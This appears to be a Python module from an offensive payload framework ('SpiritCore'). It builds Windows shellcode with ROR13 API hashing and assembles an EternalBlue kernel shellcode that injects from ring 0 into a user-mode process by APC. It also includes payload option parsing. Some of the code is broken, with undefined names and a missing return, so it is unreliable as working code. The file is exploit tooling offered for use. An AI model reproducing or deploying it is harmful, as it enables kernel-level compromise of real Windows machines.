
from SpiritCore.System import *
from SpiritCore.Lib.Build import *


class PayloadData:
    Length=0
    PayloadData=b""
    Name=""




collisions_detected = {}
modules_scanned = 0
functions_scanned = 0
#=============================================================================#
def ror( dword, bits ):
  return ( dword >> bits | dword << ( 32 - bits ) ) & 0xFFFFFFFF
#=============================================================================#
def unicode( string, uppercase=True ):
  result = "";
  if uppercase:
    string = string.upper()
  for c in string:
    result += c + "\x00"
  return result
#=============================================================================#
def hash( module, function, bits=13, print_hash=False ):
  module_hash = 0
  function_hash = 0
  for c in unicode( module + "\x00" ):
    module_hash  = ror( module_hash, bits )
    module_hash += ord( c )
  for c in str( function + "\x00" ):
    function_hash  = ror( function_hash, bits )
    function_hash += ord( c )
  h = module_hash + function_hash & 0xFFFFFFFF
  if print_hash:
    print("[+] 0x%08X = %s!%s" % ( h, module.lower(), function ))
  return h
#=============================================================================#
def scanPe( dll_path, dll_name, print_hashes=False, print_collisions=True ):
  global modules_scanned
  global functions_scanned
  try:
    dll_name = dll_name.lower()
    modules_scanned += 1
    pe = pefile.PE( os.path.join( dll_path, dll_name ) )
    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if export.name is None:
        continue
      h = hash( dll_name, export.name, print_hash=print_hashes )
      for ( col_hash, col_name ) in collisions:
        if col_hash == h and col_name != "%s!%s" % (dll_name, export.name):
          if h not in collisions_detected.keys():
            collisions_detected[h] = []
          collisions_detected[h].append( (dll_path, dll_name, export.name) )
          break
      functions_scanned += 1
  except:
    pass
#=============================================================================#
def scan_directoryPe( dir ):
  for dot, dirs, files in os.walk( dir ):
    for file_name in files:
      if file_name[-4:] == ".dll":# or file_name[-4:] == ".exe":
        scan( dot, file_name )
  print("\n[+] Found %d Collisions.\n" % ( len(collisions_detected) ))
  for h in collisions_detected.keys():
    for (col_hash, col_name ) in collisions:
      if h == col_hash:
        detected_name = col_name
        break
    print("[!] Collision detected for 0x%08X (%s):" % ( h, detected_name ))
    for (collided_dll_path, collided_dll_name, collided_export_name) in collisions_detected[h]:
      print("\t%s!%s (%s)" % ( collided_dll_name, collided_export_name, collided_dll_path ))
  print("\n[+] Scanned %d exported functions via %d modules.\n" % ( functions_scanned, modules_scanned ))
#=============================================================================#


class ShellCode:
    Architecture="x64"
    def __init__(self,Object,PayloadName,Parameate):
        self.Object=Object
        self.PayloadName=PayloadName
        self.Parameate=Parameate
    def AsmToBin(self):
        pass
    def raw_shellcode(self):
        Object = self.Object.Payload[self.PayloadName]
        Object.Parameate=self.Parameate
        return Object.Generate()

    def Ring0ApcInjectRing3Shellcode(self,ProcessName,Architecture):
        print_msg("Build ShellCode")
        Hash = bytes("0x%08x"%self.compute_hash(ProcessName.upper()+"\x00"), encoding="utf8")
        
        AsmCode= open("SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64.asm","rb").read().replace(b"Process_Hash",Hash)
        Build = "SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.asm"
        open("SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.asm", "wb+").write(AsmCode)
        import os
        BuildBin="SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.bin"
        NasmObject = NASM()
        NasmObject.SourceCode=str(AsmCode,encoding="utf-8")
        Filename = NasmObject.Generate()
        
        Bin=open(BuildBin,"rb+").read()
        print_success("Build Kernel Ring0 APC Inject Thread to Ring3 ShellCode length:%d"%len(Bin))
        return Bin
    def compute_hash(self,String, key=13):
        """
        Compute hash of WinApi functions
        """
        hash = 0
        while String:
            c_ptr = ord(String[0])
            hash = (hash << (32 - key)) & 0xffffffff | (hash >> key) & 0xffffffff
            hash += c_ptr
            String = String[1:]
        hash=hash
        return hash


class Payload:
    Name=""
    Object=None
    Values={}
    Types="Spiriter"
    required={}
    description={}
    Parameate = {}
    def Verfily(self,Parame,File,Type):
        self.Parame=Parame
        self.File=File
        self.Type=Type
        if Type in self.supportfile:
            print_success("Payload Support Generate")
            return True
        else:
            print_error("Generate File Type Not support")
            print_warning("The Payload SUPPORT Type:%s"%" ".join(self.supportfile))
            False
    def SetUUidSession(self,UUID):
        try:
            Ret = self.SessionInfo()
        except:
            Ret = self.Name
        self.Object.SessionManager[UUID].SessionInfo=Ret
    def Init(self):
        SetKey = []
        self.Parameate={}
        for key in sorted(self.Object.Values):
            self.Parameate.update({key:self.Object.Values[key]})
        if self.Object.UsePayload == True:
            for key in sorted(self.Object.PayloadParameate):
                self.Parameate.update({key:self.Object.PayloadParameate[key]})
                self.Object.UsePayloadObject.Parameate.update({key:self.Object.PayloadParameate[key]})
        

    def GetParameate(self, Name):
        return self.Values
        Parame = self.Info.get("Options")
        for parameater in Parame:
            try:
                self.r_option(*parameater)
            except Exception as e:
                print_error(e)

            return self.Values
        else:
            print_error("Not Payload:%s" % Name)
    def Inti(self,Object):
        self.Object=Object
        self.Values = {}
        self.required = {}
        self.description = {}
        self.Parameate = {}

    def r_option(self, name, value=None, required=False, description=''):
        self.Values[name] = self.SetLoadvalue(value)
        self.required[name] = required
        self.description[name] = description

    def SetLoadvalue(self, value):
        orig = value
        if value in (None, True, False): return value
        if isinstance(value, str) and value.lower() in ('none', '""', "''"):
            return None
        for type_ in (self.r_bool, int, float):
            try:
                value = type_(value)
                break
            except KeyError:
                pass
            except ValueError:
                pass
            except AttributeError:
                pass
        if type(value) is int and '.' in str(orig):
            return float(orig)
        return value

    def r_bool(self, value):
        return {'true': True, 'false': False}[value.lower()]